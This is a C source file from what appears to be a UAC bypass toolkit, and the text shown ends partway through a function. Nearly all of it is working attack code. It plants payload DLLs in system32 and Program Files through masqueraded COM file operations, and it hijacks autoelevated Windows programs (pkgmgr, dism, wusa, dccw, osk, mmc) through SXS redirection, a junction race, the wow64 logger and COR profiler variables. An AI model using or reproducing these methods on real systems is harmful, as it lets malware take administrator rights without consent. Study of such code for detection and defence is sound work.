/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2020
*
*  TITLE:       HYBRIDS.C
*
*  VERSION:     3.51
*
*  DATE:        16 Oct 2020
*
*  Hybrid UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"
#include "encresource.h"

/*
* ucmMethodCleanupSingleFileSystem32
*
* Purpose:
*
* Post execution cleanup routine.
*
* lpItemName length limited to MAX_PATH
*
*/
BOOL ucmMethodCleanupSingleItemSystem32(
    LPWSTR lpItemName
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, lpItemName);

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmxGenericAutoelevation
*
* Purpose:
*
* Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
*
*/
NTSTATUS ucmxGenericAutoelevation(
    _In_opt_ LPWSTR lpTargetApp,
    _In_ LPWSTR lpTargetDll,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szDest[MAX_PATH * 2];
    SIZE_T nSource, nLen;
    LPWSTR lpSource;

    nSource = sizeof(g_ctx->szTempDirectory) + (_strlen(lpTargetDll) * sizeof(WCHAR));
    lpSource = (LPWSTR)supHeapAlloc(nSource);
    if (lpSource == NULL)
        return STATUS_MEMORY_NOT_ALLOCATED;

    //put target dll
    _strcpy(lpSource, g_ctx->szTempDirectory);
    _strcat(lpSource, lpTargetDll);
    nLen = _strlen(lpSource);
    lpSource[nLen - 1] = L'!';

    //write proxy dll to disk
    if (supWriteBufferToFile(lpSource, ProxyDll, ProxyDllSize)) {

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);

        //drop payload to system32
        if (ucmMasqueradedMoveFileCOM(lpSource, szDest)) {

            _strcpy(lpSource, szDest);
            _strcat(lpSource, lpTargetDll);
            nLen = _strlen(lpSource);
            lpSource[nLen - 1] = L'!';

            if (ucmMasqueradedRenameElementCOM(lpSource, lpTargetDll)) {

                //run target app
                if (lpTargetApp) {
                    if (supRunProcess2(lpTargetApp, 
                        NULL, 
                        NULL, 
                        SW_HIDE, 
                        SUPRUNPROCESS_TIMEOUT_DEFAULT)) 
                    {
                        Sleep(5000);
                        MethodResult = STATUS_SUCCESS;
                    }
                }
                else {
                    MethodResult = STATUS_SUCCESS;
                }
            }
        }
    }

    supHeapFree(lpSource);

    return MethodResult;
}

/*
* ucmSXSMethod
*
* Purpose:
*
* Exploit SXS Local Redirect feature.
*
* SXS/Fusion uses dll redirection, attempting to load internal manifest dependencies from
* non existent directory (this is so called DotLocal dll redirection), it is trying to do this
* before going to WinSXS store.
*
* In this case dependency is Microsoft.Windows.Common-Controls.
*
* Maybe you think it is handy cool feature, but I think its another backdoor from lazy dotnet crew.
* "You keep shipping crap, and crap, and more crap".
*
*/
NTSTATUS ucmSXSMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize,
    _In_opt_ LPWSTR lpTargetDirectory, //single element in system32 with slash at end
    _In_ LPWSTR lpTargetApplication, //executable name
    _In_opt_ LPWSTR lpLaunchApplication, //executable name, must be in same dir as lpTargetApplication
    _In_ BOOL bConsentItself
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR* lpszFullDllPath = NULL, * lpszDirectoryName = NULL;
    SIZE_T   sz;
    LPWSTR   lpSxsPath = NULL;

    WCHAR szSrc[MAX_PATH * 2], szDst[MAX_PATH * 2];
    WCHAR szCurDir[MAX_PATH * 2];

    SXS_SEARCH_CONTEXT sctx;

    if (lpTargetApplication == NULL)
        return STATUS_INVALID_PARAMETER_3;

    if (_strlen(lpTargetApplication) > MAX_PATH)
        return STATUS_INVALID_PARAMETER_3;

    do {

        //
        // Patch Fubuki to the new entry point
        //
        if (!supReplaceDllEntryPoint(ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_SXS,
            FALSE))
        {
            break;
        }

        //common part, locate sxs dll, drop payload to temp
        RtlSecureZeroMemory(szSrc, sizeof(szSrc));
        RtlSecureZeroMemory(szDst, sizeof(szDst));

        sz = UNICODE_STRING_MAX_BYTES;

        lpszFullDllPath = (WCHAR*)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            NULL);

        if (lpszFullDllPath == NULL)
            break;

        sctx.DllName = COMCTL32_DLL;
        sctx.SxsKey = COMCTL32_SXS;
        sctx.FullDllPath = lpszFullDllPath;

        if (!sxsFindLoaderEntry(&sctx))
            break;

        lpszDirectoryName = _filename(lpszFullDllPath);
        if (lpszDirectoryName == NULL)
            break;

        sz = PAGE_SIZE + (_strlen(lpszDirectoryName) * sizeof(WCHAR));

        lpSxsPath = (LPWSTR)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            NULL);

        if (lpSxsPath == NULL)
            break;

        _strcpy(lpSxsPath, g_ctx->szSystemDirectory);
        if (lpTargetDirectory) {
            _strcat(lpSxsPath, lpTargetDirectory);
        }
        _strcpy(szDst, lpTargetApplication);

        //
        // Workaround for consent, so it won't ban itself.
        // Create all files and target directories with fake root name.
        // Next when all fileop is done, rename fake root to real.
        //
        if (bConsentItself) {
            _strcat(szDst, FAKE_LOCAL_SXS);
        }
        else {
            _strcat(szDst, LOCAL_SXS);
        }

        //create local directory
        if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, szDst))
            break;

        //create assembly directory
        _strcat(lpSxsPath, szDst);
        if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, lpszDirectoryName))
            break;
      
        _strcat(lpSxsPath, TEXT("\\"));
        _strcat(lpSxsPath, lpszDirectoryName);

        if (!ucmMasqueradedSetObjectSecurityCOM(lpSxsPath,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            T_SDDL_ALL_FOR_EVERYONE))
        {
            break;
        }

        //move payload file

        GetCurrentDirectory(MAX_PATH * 2, szCurDir);

        SetCurrentDirectory(lpSxsPath);

        if (!supWriteBufferToFile(COMCTL32_DLL, ProxyDll, ProxyDllSize))
            break;

        SetCurrentDirectory(szCurDir);

        //
        // Consent workaround end. 
        // Restore real directory name.
        //
        if (bConsentItself) {
            _strcpy(lpSxsPath, g_ctx->szSystemDirectory);
            if (lpTargetDirectory) {
                _strcat(lpSxsPath, lpTargetDirectory);
            }
            _strcat(lpSxsPath, lpTargetApplication);
            _strcat(lpSxsPath, FAKE_LOCAL_SXS);

            _strcpy(szDst, lpTargetApplication);
            _strcat(szDst, LOCAL_SXS);

            if (!ucmMasqueradedRenameElementCOM(lpSxsPath, szDst))
                break;

        }

        //run target process
        _strcpy(szDst, g_ctx->szSystemDirectory);
        if (lpTargetDirectory) {
            _strcat(szDst, lpTargetDirectory);
        }

        if (lpLaunchApplication) {
            _strcat(szDst, lpLaunchApplication);
        }
        else {
            _strcat(szDst, lpTargetApplication);
        }

        if (supRunProcess2(szDst, 
            NULL, 
            NULL, 
            SW_SHOWNORMAL, 
            1000))
        {
            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
    if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);

    return MethodResult;
}

/*
* ucmSXSMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for SXSMethod.
*
*/
BOOL ucmSXSMethodCleanup(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, CONSENT_EXE);
    _strcat(szBuffer, LOCAL_SXS);

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmxDisemer
*
* Purpose:
*
* Build parameters to the pkgmgr and force it to start dism.exe.
* 
* Note: 
* Name is a very original WD behavior signature name.
*
*/
NTSTATUS ucmxDisemer()
{
    WCHAR szApplication[MAX_PATH * 2];
    WCHAR szParameters[256];

    _strcpy(szApplication, g_ctx->szSystemDirectory);
    _strcat(szApplication, PKGMGR_EXE);

    _strcpy(szParameters, TEXT("/ip"));
    _strcat(szParameters, TEXT(" /m:"));
    _strcat(szParameters, MYSTERIOUSCUTETHING);
    _strcat(szParameters, TEXT(" /quiet"));

    if (supRunProcess2(szApplication, 
        szParameters, 
        NULL, 
        SW_HIDE, 
        SUPRUNPROCESS_TIMEOUT_DEFAULT)) 
    {
        return STATUS_SUCCESS;
    }

    return STATUS_ACCESS_DENIED;
}

/*
* ucmDismMethod
*
* Purpose:
*
* Exploit DISM application dll loading scheme.
*
* Dism.exe located in system32 folder while it dlls are in system32\dism
* When loaded dism first attempt to load dlls from system32 folder.
*
* Trigger: pkgmgr.exe
* PkgMgr.exe is autoelevated whitelisted application which is actually just calling Dism.exe
*
*/
NTSTATUS ucmDismMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    LPWSTR lpTargetDll;

    SIZE_T  nLen;
    WCHAR   szSource[MAX_PATH * 2];

    if (g_ctx->dwBuildNumber < 19041) {
        lpTargetDll = DISMCORE_DLL;
    }
    else {
        lpTargetDll = APISET_KERNEL32LEGACY;
    }

    MethodResult = ucmxGenericAutoelevation(NULL,
        lpTargetDll,
        ProxyDll,
        ProxyDllSize);

    if (NT_SUCCESS(MethodResult)) {
        MethodResult = ucmxDisemer();
    }

    //
    // Cleanup temp.
    //
    if (!NT_SUCCESS(MethodResult)) {
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, lpTargetDll);
        nLen = _strlen(szSource);
        szSource[nLen - 1] = L'!';
        DeleteFile(szSource);
    }
    return MethodResult;
}

/*
* ucmWow64LoggerMethod
*
* Purpose:
*
* Bypass UAC using wow64 logger dll and wow64 application.
*
* Trigger: 32bit version of wusa.exe
* Loader will map and call our logger dll during wow64 process initialization.
*
*/
NTSTATUS ucmWow64LoggerMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    WCHAR szTarget[MAX_PATH * 2];

    //
    // Build target application full path.
    // We need autoelevated application from syswow64 folder ONLY.
    //
    _strcpy(szTarget, USER_SHARED_DATA->NtSystemRoot);
    _strcat(szTarget, SYSWOW64_DIR);
    _strcat(szTarget, WUSA_EXE);

    //
    // Attempt to remove payload dll after execution in method.c!PostCleanupAttempt.
    // Warning: every wow64 application will load payload code (some will crash).
    // Remove file IMMEDIATELY after work.
    //

    return ucmxGenericAutoelevation(szTarget,
        WOW64LOG_DLL,
        ProxyDll,
        ProxyDllSize);
}

/*
* ucmUiAccessMethod
*
* Purpose:
*
* Bypass UAC using uiAccess(true) application.
* Original method source
* https://habrahabr.ru/company/pm/blog/328008/
*
*/
NTSTATUS ucmUiAccessMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    SIZE_T Length;
    LPWSTR lpEnv = NULL, lpTargetDll;
    UNICODE_STRING uStr = RTL_CONSTANT_STRING(L"ProgramFiles=");
    WCHAR szTarget[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];

    do {

        //
        // There is no osksupport.dll in Windows 7.
        //
        if (g_ctx->dwBuildNumber < 9200)
            lpTargetDll = DUSER_DLL;
        else
            lpTargetDll = OSKSUPPORT_DLL;

        //
        // Replace default Fubuki dll entry point with new.
        //
        if (!supReplaceDllEntryPoint(ProxyDll,
            ProxyDllSize,
            FUBUKI_EXT_ENTRYPOINT,
            FALSE))
        {
            break;
        }

        //
        // Drop modified Fubuki to the %temp%
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, lpTargetDll);
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize))
            break;

        //
        // Build target path in g_lpIncludePFDirs
        //
        lpEnv = supQueryEnvironmentVariableOffset(&uStr);
        if (lpEnv == NULL)
            break;

        Length = _strlen(lpEnv);
        if ((Length == 0) || (Length > MAX_PATH))
            break;

        RtlSecureZeroMemory(&szTarget, sizeof(szTarget));
        _strncpy(szTarget, MAX_PATH, lpEnv, MAX_PATH);
        _strcat(szTarget, TEXT("\\"));
        _strcat(szTarget, T_WINDOWSMEDIAPLAYER);
        _strcat(szTarget, TEXT("\\"));

        //
        // In case if Media Player is not installed / available.
        //
        if (!PathFileExists(szTarget)) {
            if (!ucmMasqueradedCreateSubDirectoryCOM(lpEnv, T_WINDOWSMEDIAPLAYER))
                break;
        }

        //
        // Copy Fubuki to target directory.
        // 
        if (!ucmMasqueradedMoveFileCOM(szSource, szTarget))
            break;

        //
        // Copy osk.exe to Program Files\Windows Media Player
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szSystemDirectory);
        _strcat(szSource, OSK_EXE);
        if (!ucmMasqueradedMoveCopyFileCOM(szSource, szTarget, FALSE))
            break;

        //
        // Run uiAccess osk.exe from Program Files.
        //
        _strcat(szTarget, OSK_EXE);
        if (supRunProcess2(szTarget, NULL, NULL, SW_SHOW, 0)) {
            //
            // Run eventvwr.exe as final trigger.
            // Spawns mmc.exe with eventvwr.msc snap-in.
            //
            _strcpy(szTarget, g_ctx->szSystemDirectory);
            _strcat(szTarget, EVENTVWR_EXE);
            if (supRunProcess2(szTarget, NULL, NULL, SW_SHOW, 0))
                MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    return MethodResult;
}

/*
* ucmJunctionMethodPreNetfx48
*
* Purpose:
*
* Bypass UAC using two different steps:
*
* 1) Create wusa.exe race condition and force wusa to copy files to the protected directory using NTFS reparse point.
* 2) Dll hijack dotnet dependencies.
*
* Wusa race condition in combination with junctions found by Thomas Vanhoutte.
*
*/
NTSTATUS ucmJunctionMethodPreNetfx48(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    BOOL bDropComplete = FALSE, bWusaNeedCleanup = FALSE;
    HKEY hKey = NULL;
    LRESULT lResult;

    LPWSTR lpTargetDirectory = NULL, lpEnd = NULL;

    DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;

    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];
    do {

        //
        // Drop payload dll to %temp% and make cab for it.
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);

        if (g_ctx->dwBuildNumber < 9600) {
            _strcat(szSource, OLE32_DLL);
        }
        else {
            _strcat(szSource, MSCOREE_DLL);
        }

        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szSource, ProxyDll, ProxyDllSize, NULL);
        if (!bWusaNeedCleanup)
            break;

        //
        // Locate target directory.
        //
        lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_CLIENT, 0, MAXIMUM_ALLOWED, &hKey);
        if (lResult != ERROR_SUCCESS)
            break;

        lResult = RegQueryInfoKey(hKey,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            &cValues,
            &cbMaxValueNameLen,
            NULL,
            NULL,
            NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        if ((cValues == 0) || (cbMaxValueNameLen == 0))
            break;

        if (cbMaxValueNameLen > MAX_PATH)
            break;

        bDropComplete = FALSE;

        //
        // Drop file in each.
        //
        for (i = 0; i < cValues; i++) {

            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
            bytesIO = MAX_PATH;

            lResult = RegEnumValue(hKey,
                i,
                (LPWSTR)&szBuffer,
                &bytesIO,
                NULL,
                NULL,
                NULL,
                NULL);

            lpTargetDirectory = _filepath(szBuffer, szBuffer);
            if (lpTargetDirectory == NULL) {
                bDropComplete = FALSE;
                break;
            }

            lpEnd = _strend(lpTargetDirectory);
            if (*(lpEnd - 1) == TEXT('\\'))
                *(lpEnd - 1) = TEXT('\0');

            if (!ucmWusaExtractViaJunction(lpTargetDirectory)) {
                bDropComplete = FALSE;
                break;
            }

            bDropComplete = TRUE;
        }

        if (!bDropComplete)
            break;

        //
        // Exploit dll hijacking.
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, DCOMCNFG_EXE);
        if (supRunProcess(szBuffer, NULL))
            MethodResult = STATUS_SUCCESS;


    } while (FALSE);

    if (hKey != NULL)
        RegCloseKey(hKey);

    if (bWusaNeedCleanup) {

        //
        // Remove cabinet file if exist.
        //
        ucmWusaCabinetCleanup();
    }

    return MethodResult;
}

/*
* ucmJunctionMethod
*
* Purpose:
*
* Bypass UAC using two different steps:
*
* 1) Create wusa.exe race condition and force wusa to copy files to the protected directory using NTFS reparse point.
* 2) Depending on Netfx available version hijack pkgmgr.exe using dll search order abuse or hijack dotnet dependencies for dcomcnfg.exe
*
* Wusa race condition in combination with junctions found by Thomas Vanhoutte.
* 
* Note:
* This method final part is similar to Dism method.
*
*/
NTSTATUS ucmJunctionMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    BOOL bWusaNeedCleanup = FALSE;

    LPWSTR lpEnd = NULL, lpTargetDll;

    WCHAR szBuffer[MAX_PATH * 2];

    if (supIsNetfx48PlusInstalled() == FALSE)
        return ucmJunctionMethodPreNetfx48(ProxyDll, ProxyDllSize);

    do {

        if (g_ctx->dwBuildNumber < 19041) {
            lpTargetDll = DISMCORE_DLL;
        }
        else {
            lpTargetDll = APISET_KERNEL32LEGACY;
        }

        //
        // Drop payload dll to %temp% and make cab for it.
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, lpTargetDll);

        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szBuffer, ProxyDll, ProxyDllSize, NULL);
        if (!bWusaNeedCleanup)
            break;

        _strcpy(szBuffer, g_ctx->szSystemDirectory);

        lpEnd = _strend(szBuffer);
        if (*(lpEnd - 1) == TEXT('\\'))
            *(lpEnd - 1) = TEXT('\0');

        if (!ucmWusaExtractViaJunction(szBuffer))
            break;

        Sleep(2000);

        MethodResult = ucmxDisemer();

    } while (FALSE);


    if (bWusaNeedCleanup) {

        //
        // Remove cabinet file if exist.
        //
        ucmWusaCabinetCleanup();
    }

    return MethodResult;
}

/*
* ucmJunctionMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for JunctionMethod.
*
*/
BOOL ucmJunctionMethodCleanup(
    VOID
)
{
    BOOL bResult = FALSE;

    HKEY hKey = NULL;
    LRESULT lResult;

    LPWSTR lpTargetDirectory = NULL, lpEnd = NULL, lpTargetDll = NULL;

    DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;

    WCHAR szBuffer[MAX_PATH * 2];

    if (supIsNetfx48PlusInstalled()) {
        return ucmMethodCleanupSingleItemSystem32(DISMCORE_DLL);
    }

    do {

        if (g_ctx->dwBuildNumber < 9600) {
            lpTargetDll = OLE32_DLL;
        }
        else {
            lpTargetDll = MSCOREE_DLL;
        }

        //
       // Locate target directory.
       //
        lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_CLIENT, 0, MAXIMUM_ALLOWED, &hKey);
        if (lResult != ERROR_SUCCESS)
            break;

        lResult = RegQueryInfoKey(hKey,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            &cValues,
            &cbMaxValueNameLen,
            NULL,
            NULL,
            NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        if ((cValues == 0) || (cbMaxValueNameLen == 0))
            break;

        if (cbMaxValueNameLen > MAX_PATH)
            break;

        //
        // Delete target file in each.
        //
        for (i = 0; i < cValues; i++) {

            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
            bytesIO = MAX_PATH;

            lResult = RegEnumValue(hKey,
                i,
                (LPWSTR)&szBuffer,
                &bytesIO,
                NULL,
                NULL,
                NULL,
                NULL);

            lpTargetDirectory = _filepath(szBuffer, szBuffer);
            if (lpTargetDirectory == NULL) {
                break;
            }

            lpEnd = _strend(lpTargetDirectory);
            if (*(lpEnd - 1) != TEXT('\\'))
                _strcat(lpEnd, TEXT("\\"));

            _strcat(szBuffer, lpTargetDll);

            ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
        }

        bResult = TRUE;

    } while (FALSE);

    return bResult;
}

/*
* ucmSXSDccwMethod
*
* Purpose:
*
* Similar to ucmSXSMethod, except using different target app and dll.
* Dccw idea by Ernesto Fernandez (https://github.com/L3cr0f/DccwBypassUAC)
*
*/
NTSTATUS ucmSXSDccwMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    BOOL     bWusaNeedCleanup = FALSE;
    HMODULE  hGdiPlus = NULL;
    WCHAR* lpszFullDllPath = NULL, * lpszDirectoryName = NULL;
    SIZE_T   sz;
    LPWSTR   lpSxsPath = NULL, lpEnd;

    WCHAR szBuffer[MAX_PATH * 2], szTarget[MAX_PATH * 2];

    SXS_SEARCH_CONTEXT sctx;

    do {
        //
        // Check if target app available. Maybe unavailable in server edition.
        //
        _strcpy(szTarget, g_ctx->szSystemDirectory);
        _strcat(szTarget, DCCW_EXE);
        if (!PathFileExists(szTarget)) {
            MethodResult = STATUS_OBJECT_NAME_NOT_FOUND;
            break;
        }

        //
        // Load GdiPlus in our address space to get it full path.
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, GDIPLUS_DLL);
        hGdiPlus = LoadLibrary(szBuffer);
        if (hGdiPlus == NULL) {
            MethodResult = STATUS_DLL_NOT_FOUND;
            break;
        }

        sz = UNICODE_STRING_MAX_BYTES;

        lpszFullDllPath = (WCHAR*)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            NULL);

        if (lpszFullDllPath == NULL)
            break;

        sctx.DllName = GDIPLUS_DLL;
        sctx.SxsKey = GDIPLUS_SXS;
        sctx.FullDllPath = lpszFullDllPath;

        if (!sxsFindLoaderEntry(&sctx)) {
            MethodResult = STATUS_SXS_KEY_NOT_FOUND;
            break;
        }

        lpszDirectoryName = _filename(lpszFullDllPath);
        if (lpszDirectoryName == NULL)
            break;

        sz = _strlen(lpszDirectoryName) * sizeof(WCHAR);
        sz += PAGE_SIZE;

        lpSxsPath = (LPWSTR)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            NULL);

        if (lpSxsPath == NULL)
            break;

        //
        // Create DotLocal path.
        //
        _strcpy(lpSxsPath, DCCW_EXE);
        _strcat(lpSxsPath, LOCAL_SXS);
        _strcat(lpSxsPath, TEXT("\\"));
        _strcat(lpSxsPath, lpszDirectoryName);
        _strcat(lpSxsPath, TEXT("\\"));
        _strcat(lpSxsPath, GDIPLUS_DLL);

        //
        // Create fake cab file.
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, GDIPLUS_DLL);

        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(
            szBuffer,
            ProxyDll,
            ProxyDllSize,
            lpSxsPath);

        if (!bWusaNeedCleanup)
            break;

        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        lpEnd = _strend(szBuffer);
        if (*(lpEnd - 1) == TEXT('\\'))
            *(lpEnd - 1) = TEXT('\0');

        if (!ucmWusaExtractViaJunction(szBuffer))
            break;

        Sleep(2000);

        //
        // Run target.
        //
        if (supRunProcess(szTarget, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Cleanup resources.
    //
    if (hGdiPlus != NULL) FreeLibrary(hGdiPlus);
    if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
    if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);
    if (bWusaNeedCleanup) ucmWusaCabinetCleanup();

    return MethodResult;
}

/*
* ucmSXSDccwMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for SXSDccwMethod.
*
*/
BOOL ucmSXSDccwMethodCleanup(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, DCCW_EXE);
    _strcat(szBuffer, LOCAL_SXS);

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmCorProfilerMethod
*
* Purpose:
*
* Bypass UAC using COR profiler.
* http://seclists.org/fulldisclosure/2017/Jul/11
*
*/
NTSTATUS ucmCorProfilerMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    SIZE_T   sz = 0;
    GUID     guid;
    HKEY     hKey = NULL;
    LRESULT  lResult;
    LPOLESTR OutputGuidString = NULL;

    WCHAR szBuffer[MAX_PATH * 2], szRegBuffer[MAX_PATH * 4];

    do {
        //
        // Create unique GUID
        //
        if (CoCreateGuid(&guid) != S_OK)
            break;

        if (StringFromCLSID(&guid, &OutputGuidString) != S_OK)
            break;

        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, MYSTERIOUSCUTETHING);
        _strcat(szBuffer, TEXT(".dll"));
        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        supSetEnvVariable(FALSE, NULL, COR_ENABLE_PROFILING, TEXT("1"));
        supSetEnvVariable(FALSE, NULL, COR_PROFILER, OutputGuidString);

        if (g_ctx->dwBuildNumber >= 9200) {
            supSetEnvVariable(FALSE, NULL, COR_PROFILER_PATH, szBuffer);
        }
        else {
            //
            // On Windows 7 target written on 3+ dotnet, registration required.
            //
            _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
            _strcat(szRegBuffer, OutputGuidString);
            _strcat(szRegBuffer, T_REG_INPROCSERVER32);

            hKey = NULL;
            lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szRegBuffer, 0, NULL,
                REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
            if (lResult == ERROR_SUCCESS) {

                sz = (1 + _strlen(szBuffer)) * sizeof(WCHAR);
                lResult = RegSetValueEx(
                    hKey,
                    TEXT(""),
                    0,
                    REG_SZ,
                    (BYTE*)szBuffer,
                    (DWORD)sz);

                if (lResult == ERROR_SUCCESS) {

                    RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
                    _strcpy(szRegBuffer, T_APARTMENT);
                    sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
                    RegSetValueEx(
                        hKey,
                        T_THREADINGMODEL,
                        0,
                        REG_SZ,
                        (BYTE*)szRegBuffer,
                        (DWORD)sz);

                }

                RegCloseKey(hKey);
            }
        }

        //
        // Load target app and trigger cor profiler, eventvwr snap-in is written in the dotnet.
        //
        if (supRunProcess2(MMC_EXE,
            EVENTVWR_MSC,
            NULL,
            SW_SHOW,
            SUPRUNPROCESS_TIMEOUT_DEFAULT))
        {
            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    //
    // Cleanup.
    //
    if (OutputGuidString != NULL) {
        supSetEnvVariable(TRUE, NULL, COR_PROFILER, NULL);
        CoTaskMemFree(OutputGuidString);
    }

    supSetEnvVariable(TRUE, NULL, COR_ENABLE_PROFILING, NULL);

    if (g_ctx->dwBuildNumber >= 9200)
        supSetEnvVariable(TRUE, NULL, COR_PROFILER_PATH, NULL);

    return MethodResult;
}

/*
* ucmDccwCOMMethod
*
* Purpose:
*
* Bypass UAC using ColorDataProxy/CCMLuaUtil undocumented COM interfaces.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
NTSTATUS ucmDccwCOMMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
    HRESULT          r = E_FAIL, hr_init;
    BOOL             bIntApproved1 = FALSE, bIntApproved2 = FALSE;

    SIZE_T           sz = 0;

    ICMLuaUtil* CMLuaUtil = NULL;
    IColorDataProxy* ColorDataProxy = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {
        //
        // Potential fix check.
        //
        if (supIsConsentApprovedInterface(T_CLSID_ColorDataProxy, &bIntApproved1)) {
            if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bIntApproved2))
                if ((bIntApproved1 == FALSE) || (bIntApproved2 == FALSE)) {
                    MethodResult = STATUS_NOINTERFACE;
                    break;
                }
        }


        sz = _strlen(lpszPayload);
        if (sz == 0) {
            MethodResult = STATUS_INVALID_PARAMETER;
            break;
        }

        //
        // Create elevated COM object for CMLuaUtil.
        //
        r = ucmAllocateElevatedObject(
            T_CLSID_CMSTPLUA,
            &IID_ICMLuaUtil,
            CLSCTX_LOCAL_SERVER,
            &CMLuaUtil);

        if (r != S_OK) {
            break;
        }

